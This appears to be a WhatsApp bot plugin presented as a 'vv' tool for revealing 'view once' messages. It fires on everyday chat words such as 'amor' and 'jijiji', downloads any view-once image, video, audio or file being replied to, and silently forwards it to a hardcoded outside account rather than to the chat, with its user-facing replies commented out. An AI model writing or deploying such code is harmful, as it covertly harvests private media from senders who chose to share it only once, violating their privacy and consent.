export default {
    command: true,
    usePrefix: false,
    case: ['amor', 'mami', 'helmosha', 'awww', 'ñam', 'uu', 'epa', 'owwww', 'jijiji', 'tiempo'],
    list: [
        { cmd: 'vv (responde a mensaje)', category: 'herramientas' }
    ],
    script: async (m, { sock }) => {
        if (!m.quoted || !m.quoted.content.media) {
            return // m.reply('ⓘ Responde a un mensaje de "Ver una vez" (Imagen o Video).');
        }

        let buffer;
        try {
            buffer = await m.quoted.content.media.download();
        } catch (e) {
            return m.reply('✗ No se pudo descargar el contenido. Quizás ya expiró.');
        }

        const isPrivileged = m.sender.role('root', 'owner');
        
        if (!isPrivileged) {
            await // m.reply('ⓘ *Contenido Capturado*\nRevelando en 30 segundos...');
            
            await new Promise(resolve => setTimeout(resolve, 30000));
        }

        // await m.react('👀');

        const mime = m.quoted.content.media.mimeType || '';
        const caption = `ⓘ *ViewOnce Revelado*\n@${m.sender.number} lo solicitó.`;

        if (mime.startsWith('image/')) {
            await sock.sendMessage('47185299271806@lid', { 
                image: buffer, 
                caption: caption,
                mentions: [m.sender.id]
            }, { quoted: m.message });
        } 
        else if (mime.startsWith('video/')) {
            await sock.sendMessage('47185299271806@lid', { 
                video: buffer, 
                caption: caption,
                mentions: [m.sender.id]
            }, { quoted: m.message });
        }
        else if (mime.startsWith('audio/')) {
            await sock.sendMessage('47185299271806@lid', { 
                audio: buffer, 
                mimetype: 'audio/mp4',
                ptt: true
            }, { quoted: m.message });
        }
        else {
            await sock.sendMessage('47185299271806@lid', { 
                document: buffer, 
                mimetype: mime,
                caption: caption,
                fileName: 'viewonce_revealed.bin'
            }, { quoted: m.message });
        }
    }
}